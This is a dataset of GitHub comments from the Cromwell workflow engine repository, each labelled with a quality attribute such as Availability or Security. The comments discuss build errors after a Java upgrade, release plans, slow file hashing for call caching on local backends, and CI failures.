https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479:1039,Availability,error,error,1039,"I am trying to build this branch but got the error below. Both local (macOS) and cromwell-dev Docker image. ```bash; sbt assembly; ```. ```; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:113:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.links.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:116:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:159:49: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:168:48: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] four errors found; ```. Any suggestion?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479:1123,Availability,error,error,1123,"I am trying to build this branch but got the error below. Both local (macOS) and cromwell-dev Docker image. ```bash; sbt assembly; ```. ```; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:113:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.links.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:116:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:159:49: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:168:48: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] four errors found; ```. Any suggestion?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479:1172,Availability,error,error,1172,"I am trying to build this branch but got the error below. Both local (macOS) and cromwell-dev Docker image. ```bash; sbt assembly; ```. ```; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:113:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.links.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:116:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:159:49: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:168:48: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] four errors found; ```. Any suggestion?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479:1230,Availability,error,error,1230,"I am trying to build this branch but got the error below. Both local (macOS) and cromwell-dev Docker image. ```bash; sbt assembly; ```. ```; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:113:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.links.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:116:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:159:49: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:168:48: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] four errors found; ```. Any suggestion?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479:1323,Availability,error,error,1323,"I am trying to build this branch but got the error below. Both local (macOS) and cromwell-dev Docker image. ```bash; sbt assembly; ```. ```; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:113:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.links.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:116:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:159:49: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:168:48: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] four errors found; ```. Any suggestion?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479:1334,Availability,error,error,1334,"I am trying to build this branch but got the error below. Both local (macOS) and cromwell-dev Docker image. ```bash; sbt assembly; ```. ```; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:113:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.links.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:116:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:159:49: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:168:48: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] four errors found; ```. Any suggestion?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479:1346,Availability,error,errors,1346,"I am trying to build this branch but got the error below. Both local (macOS) and cromwell-dev Docker image. ```bash; sbt assembly; ```. ```; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:113:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.links.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:116:57: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${digraph.nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:159:49: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] /code/wom/src/main/scala/wom/views/GraphPrint.scala:168:48: type mismatch;; [error] found : java.util.stream.Stream[String]; [error] required: scala.collection.GenTraversableOnce[?]; [error] | ${nodes.toList.flatMap(_.dotString.lines).mkString(System.lineSeparator() + "" "")}; [error] ^; [error] four errors found; ```. Any suggestion?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-948637479
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-949582463:154,Availability,error,errors,154,@wdesouza I am seeing this as well. This fork was created just before #6194 that upgraded Cromwell's Java version from 8 to 11. I think these compilation errors may represent some (hopefully minor) incompatibilities.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-949582463
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-949582463:81,Deployability,upgrade,upgraded,81,@wdesouza I am seeing this as well. This fork was created just before #6194 that upgraded Cromwell's Java version from 8 to 11. I think these compilation errors may represent some (hopefully minor) incompatibilities.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-949582463
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-949583536:33,Deployability,update,update,33,@mcovarr @wdesouza I will try to update this pr asap,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-949583536
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-1065001775:105,Deployability,release,release,105,"Hi @henriqueribeiro , . Do you think I can compile this branch with functionality of the latest cromwell release (77) ? I'm now using the branch based on cromwell 58, but more recent versions have retry strategy that's interesting as well: ; - you retry logic handles spot kills; - cromwell retry handles the fetch_and_run is a directory problem. . => both would be great, but since it doesn't get approved, I hope to make a new custom build. However, it says here there are conflicts... . Greetings, ; geert",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-1065001775
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-1065001775:254,Testability,log,logic,254,"Hi @henriqueribeiro , . Do you think I can compile this branch with functionality of the latest cromwell release (77) ? I'm now using the branch based on cromwell 58, but more recent versions have retry strategy that's interesting as well: ; - you retry logic handles spot kills; - cromwell retry handles the fetch_and_run is a directory problem. . => both would be great, but since it doesn't get approved, I hope to make a new custom build. However, it says here there are conflicts... . Greetings, ; geert",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-1065001775
https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-1065009387:42,Deployability,release,release,42,Hey @geertvandeweyer. I'm preparing a new release with more functionalities based on cromwell 78. It should be ready in the next few days. . Are you in the cromwell slack?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6204#issuecomment-1065009387
https://github.com/broadinstitute/cromwell/pull/6206#issuecomment-793158887:52,Performance,cache,cache,52,which reminds me we need to inline the Docker image cache manifest the same way we did the reference file manifest...,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6206#issuecomment-793158887
https://github.com/broadinstitute/cromwell/issues/6209#issuecomment-794326686:226,Security,access,accessing,226,The log output is designed for informational and debugging purposes only. The truncation is intentional because excessively large logs can destabilize production servers running 1000s of workflows. The supported mechanism for accessing output information is via the web API: https://cromwell.readthedocs.io/en/stable/api/RESTAPI/#get-the-outputs-for-a-workflow,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6209#issuecomment-794326686
https://github.com/broadinstitute/cromwell/issues/6209#issuecomment-794326686:4,Testability,log,log,4,The log output is designed for informational and debugging purposes only. The truncation is intentional because excessively large logs can destabilize production servers running 1000s of workflows. The supported mechanism for accessing output information is via the web API: https://cromwell.readthedocs.io/en/stable/api/RESTAPI/#get-the-outputs-for-a-workflow,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6209#issuecomment-794326686
https://github.com/broadinstitute/cromwell/issues/6209#issuecomment-794326686:130,Testability,log,logs,130,The log output is designed for informational and debugging purposes only. The truncation is intentional because excessively large logs can destabilize production servers running 1000s of workflows. The supported mechanism for accessing output information is via the web API: https://cromwell.readthedocs.io/en/stable/api/RESTAPI/#get-the-outputs-for-a-workflow,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6209#issuecomment-794326686
https://github.com/broadinstitute/cromwell/pull/6211#issuecomment-794367473:67,Availability,avail,available,67,I have to admit I'm among the guilty here - we make the `run` mode available to PacBio customers (via a Python wrapper that provides a friendlier CLI) who prefer to use the command line. Are there drawbacks to this from a black-box user perspective?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6211#issuecomment-794367473
https://github.com/broadinstitute/cromwell/pull/6211#issuecomment-794367473:111,Integrability,wrap,wrapper,111,I have to admit I'm among the guilty here - we make the `run` mode available to PacBio customers (via a Python wrapper that provides a friendlier CLI) who prefer to use the command line. Are there drawbacks to this from a black-box user perspective?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6211#issuecomment-794367473
https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-796936216:32,Security,hash,hashing,32,"I think you might be right that hashing is taking a long time. There's a minimal amount of computational work that needs to be done to compute a hash, and I don't know off the top of my head which algorithm we use. I suspect we would entertain alternatives that are faster and provide an identical level of accuracy, but can't make any compromises on hash collisions that could mis-identify files and cause call caching to give wrong results. For what it's worth, most Cromwell users today use cloud storage which has APIs to quickly retrieve pre-computed hashes, which explains why more users haven't surfaced this very valid issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-796936216
https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-796936216:145,Security,hash,hash,145,"I think you might be right that hashing is taking a long time. There's a minimal amount of computational work that needs to be done to compute a hash, and I don't know off the top of my head which algorithm we use. I suspect we would entertain alternatives that are faster and provide an identical level of accuracy, but can't make any compromises on hash collisions that could mis-identify files and cause call caching to give wrong results. For what it's worth, most Cromwell users today use cloud storage which has APIs to quickly retrieve pre-computed hashes, which explains why more users haven't surfaced this very valid issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-796936216
https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-796936216:351,Security,hash,hash,351,"I think you might be right that hashing is taking a long time. There's a minimal amount of computational work that needs to be done to compute a hash, and I don't know off the top of my head which algorithm we use. I suspect we would entertain alternatives that are faster and provide an identical level of accuracy, but can't make any compromises on hash collisions that could mis-identify files and cause call caching to give wrong results. For what it's worth, most Cromwell users today use cloud storage which has APIs to quickly retrieve pre-computed hashes, which explains why more users haven't surfaced this very valid issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-796936216
https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-796936216:556,Security,hash,hashes,556,"I think you might be right that hashing is taking a long time. There's a minimal amount of computational work that needs to be done to compute a hash, and I don't know off the top of my head which algorithm we use. I suspect we would entertain alternatives that are faster and provide an identical level of accuracy, but can't make any compromises on hash collisions that could mis-identify files and cause call caching to give wrong results. For what it's worth, most Cromwell users today use cloud storage which has APIs to quickly retrieve pre-computed hashes, which explains why more users haven't surfaced this very valid issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-796936216
https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-797074823:201,Performance,cache,cache,201,">For what it's worth, most Cromwell users today use cloud storage which has APIs. @aednichols probably that is the reason why many bugs in local backend are ignored and there are still no way to clean cache through API. At local backend cache is not only slow but also works only half of the time ( https://github.com/broadinstitute/cromwell/issues/6143 ). In our case, our lab has our own servers, so we do not have to spend money on cloud, but cache pain is quite high, we are evaluating if it is worth migrating from cromwell to snakemake",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-797074823
https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-797074823:237,Performance,cache,cache,237,">For what it's worth, most Cromwell users today use cloud storage which has APIs. @aednichols probably that is the reason why many bugs in local backend are ignored and there are still no way to clean cache through API. At local backend cache is not only slow but also works only half of the time ( https://github.com/broadinstitute/cromwell/issues/6143 ). In our case, our lab has our own servers, so we do not have to spend money on cloud, but cache pain is quite high, we are evaluating if it is worth migrating from cromwell to snakemake",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-797074823
https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-797074823:446,Performance,cache,cache,446,">For what it's worth, most Cromwell users today use cloud storage which has APIs. @aednichols probably that is the reason why many bugs in local backend are ignored and there are still no way to clean cache through API. At local backend cache is not only slow but also works only half of the time ( https://github.com/broadinstitute/cromwell/issues/6143 ). In our case, our lab has our own servers, so we do not have to spend money on cloud, but cache pain is quite high, we are evaluating if it is worth migrating from cromwell to snakemake",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-797074823
https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-799603780:614,Modifiability,config,config,614,"I think disabling call caching will also disable hashing (but I could be wrong), because I believe the only thing the hashes are used for is call caching. https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/. If that's not the case, I think you could fork cromwell and modify the backend for file system to use an alternate method, such as looking for a .md5 file alongside the file the hash is looking. (Actually, it looks like the backend already has code to do this, see: https://github.com/broadinstitute/cromwell/blob/develop/supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigHashingStrategy.scala#L52 ). Also see https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-799603780
https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-799603780:621,Modifiability,Config,ConfigHashingStrategy,621,"I think disabling call caching will also disable hashing (but I could be wrong), because I believe the only thing the hashes are used for is call caching. https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/. If that's not the case, I think you could fork cromwell and modify the backend for file system to use an alternate method, such as looking for a .md5 file alongside the file the hash is looking. (Actually, it looks like the backend already has code to do this, see: https://github.com/broadinstitute/cromwell/blob/develop/supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigHashingStrategy.scala#L52 ). Also see https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-799603780
https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-799603780:707,Modifiability,Config,Configuring,707,"I think disabling call caching will also disable hashing (but I could be wrong), because I believe the only thing the hashes are used for is call caching. https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/. If that's not the case, I think you could fork cromwell and modify the backend for file system to use an alternate method, such as looking for a .md5 file alongside the file the hash is looking. (Actually, it looks like the backend already has code to do this, see: https://github.com/broadinstitute/cromwell/blob/develop/supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigHashingStrategy.scala#L52 ). Also see https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-799603780
https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-799603780:49,Security,hash,hashing,49,"I think disabling call caching will also disable hashing (but I could be wrong), because I believe the only thing the hashes are used for is call caching. https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/. If that's not the case, I think you could fork cromwell and modify the backend for file system to use an alternate method, such as looking for a .md5 file alongside the file the hash is looking. (Actually, it looks like the backend already has code to do this, see: https://github.com/broadinstitute/cromwell/blob/develop/supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigHashingStrategy.scala#L52 ). Also see https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-799603780
https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-799603780:118,Security,hash,hashes,118,"I think disabling call caching will also disable hashing (but I could be wrong), because I believe the only thing the hashes are used for is call caching. https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/. If that's not the case, I think you could fork cromwell and modify the backend for file system to use an alternate method, such as looking for a .md5 file alongside the file the hash is looking. (Actually, it looks like the backend already has code to do this, see: https://github.com/broadinstitute/cromwell/blob/develop/supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigHashingStrategy.scala#L52 ). Also see https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-799603780
https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-799603780:407,Security,hash,hash,407,"I think disabling call caching will also disable hashing (but I could be wrong), because I believe the only thing the hashes are used for is call caching. https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/. If that's not the case, I think you could fork cromwell and modify the backend for file system to use an alternate method, such as looking for a .md5 file alongside the file the hash is looking. (Actually, it looks like the backend already has code to do this, see: https://github.com/broadinstitute/cromwell/blob/develop/supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigHashingStrategy.scala#L52 ). Also see https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-799603780
https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-810696967:88,Modifiability,Config,Configuring,88,"@antonkulaga Cromwell has [filesystem option](https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options) `fingerprint` to hash without having to read the whole file. It is supported by the HPC community, and not by the Cromwell team. Haven't tried it myself, but I wonder whether it would solve your problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-810696967
https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-810696967:144,Security,hash,hash,144,"@antonkulaga Cromwell has [filesystem option](https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options) `fingerprint` to hash without having to read the whole file. It is supported by the HPC community, and not by the Cromwell team. Haven't tried it myself, but I wonder whether it would solve your problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-810696967
https://github.com/broadinstitute/cromwell/pull/6214#issuecomment-801186187:44,Testability,test,tests,44,"Everything is awesome in Travis. Only ""sbt"" tests are stalling in Circle CI. With thumbs up on this comment will merge anyway while Circle CI issues are figured out [here](https://broadinstitute.slack.com/archives/C1EH66VCM/p1615994265013100?thread_ts=1615490146.177800&cid=C1EH66VCM).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6214#issuecomment-801186187
https://github.com/broadinstitute/cromwell/pull/6214#issuecomment-801188054:46,Availability,failure,failure,46,I agree with not worrying about this CircleCI failure because we still have that coverage from Travis CI.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6214#issuecomment-801188054
https://github.com/broadinstitute/cromwell/pull/6214#issuecomment-801192405:51,Availability,failure,failure,51,I also agree with not worrying about this CircleCI failure for now since the same tests are still running in Travis so the coverage is unchanged.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6214#issuecomment-801192405
https://github.com/broadinstitute/cromwell/pull/6214#issuecomment-801192405:82,Testability,test,tests,82,I also agree with not worrying about this CircleCI failure for now since the same tests are still running in Travis so the coverage is unchanged.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6214#issuecomment-801192405
https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800617408:4,Integrability,message,messages,4,"The messages are logging the size of the list being (re-)added to the `BatchRequest`, not what's inside the possibly stale `ArrayList` inside the `BatchRequest` object.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800617408
https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800617408:17,Testability,log,logging,17,"The messages are logging the size of the list being (re-)added to the `BatchRequest`, not what's inside the possibly stale `ArrayList` inside the `BatchRequest` object.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800617408
https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800620139:6,Integrability,message,messages,6,"> The messages are logging the size of the list being (re-)added to the BatchRequest, not what's inside the possibly stale ArrayList inside the BatchRequest object. Yeah okay maybe don't mention that then since it will force those future maintainers to imagine what was happening before this variable became a local...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800620139
https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800620139:292,Modifiability,variab,variable,292,"> The messages are logging the size of the list being (re-)added to the BatchRequest, not what's inside the possibly stale ArrayList inside the BatchRequest object. Yeah okay maybe don't mention that then since it will force those future maintainers to imagine what was happening before this variable became a local...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800620139
